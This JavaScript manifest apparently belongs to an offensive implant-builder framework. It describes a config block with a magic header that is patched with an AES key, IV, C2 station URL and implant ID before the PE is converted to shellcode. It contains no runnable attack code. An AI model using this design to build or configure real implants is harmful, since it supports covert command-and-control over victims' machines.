const manifest = {
  "title": "Magic-Header Config Block",
  "component_type": "config",
  "author": "ph3eds",
  "description": "Static config block with THORNCFG magic header. Non-zero placeholder bytes force the block into .data so it survives donut conversion. The builder locates the magic and patches key/iv/url/imp_id into the compiled PE before shellcode generation.",
  "mitre": [],
  "references": [],
  "parameters": [
    {
      "name": "key",
      "placeholder": "{{KEY}}",
      "type": "",
      "description": "32-byte AES-256 key",
      "default": ""
    },
    {
      "name": "iv",
      "placeholder": "{{IV}}",
      "type": "",
      "description": "16-byte AES-CBC IV",
      "default": ""
    },
    {
      "name": "station",
      "placeholder": "{{STATION}}",
      "type": "",
      "description": "C2 station URL (max 255 chars)",
      "default": ""
    },
    {
      "name": "imp_id",
      "placeholder": "{{IMP_ID}}",
      "type": "",
      "description": "Implant identifier string (max 63 chars)",
      "default": ""
    }
  ],
  "cargo_deps": {}
}
export { manifest }
